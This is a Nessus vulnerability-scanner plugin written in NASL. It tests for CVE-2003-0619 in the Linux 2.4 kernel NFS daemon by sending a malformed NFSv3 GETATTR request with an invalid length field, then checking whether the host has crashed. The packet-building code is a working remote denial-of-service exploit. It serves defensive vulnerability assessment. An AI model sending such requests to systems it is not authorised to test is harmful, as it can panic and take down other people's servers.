#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(11813);
 script_version("$Revision: 1.22 $");
 script_cvs_date("$Date: 2017/02/16 21:23:29 $");

 script_cve_id("CVE-2003-0619");
 script_bugtraq_id(8298);
 script_osvdb_id(2353);

 script_name(english:"Linux 2.4 NFSv3 knfsd Malformed GETATTR Request Remote DoS");
 script_summary(english:"checks the presence of a DoS in the remote knfsd");

 script_set_attribute(attribute:"synopsis", value:"The remote NFS daemon is prone to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"The remote host is running knfsd, a kernel NFS daemon.

There is a vulnerability in this version that may allow an attacker to
cause a kernel panic on the remote host by sending a malformed GETATTR
request with an invalid length field.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Jul/103");
 script_set_attribute(attribute:"solution", value:
"Upgrade to Linux kernel version 2.4.21 (or later) as the issue
reportedly has been silently patched in that version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/07/29");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/08/01");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap", "Settings/ParanoidReport");

 exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("nfs_func.inc");
include("sunrpc_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

function dos(soc)
{
 local_var i, len, pad, r, req, ret;

 pad = padsz(len:strlen(this_host_name()));
  len = 20 + strlen(this_host_name()) + pad;
 req =  	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100003) +
		   rpclong(val:3) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   raw_string(0xFF, 0xFF, 0xFF, 0xFF);

   send(socket:soc, data:req);
   r = recv(socket:soc, length:8192);
   return(strlen(r));
}

start_denial();
port = get_rpc_port2(program:100003, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

soc = open_priv_sock_udp(dport:port);
if ( ! soc ) exit(0);
result = dos(soc:soc);
if(!result)
{
 alive = end_denial();
 if(!alive)security_hole(port:port, proto:"udp");
}
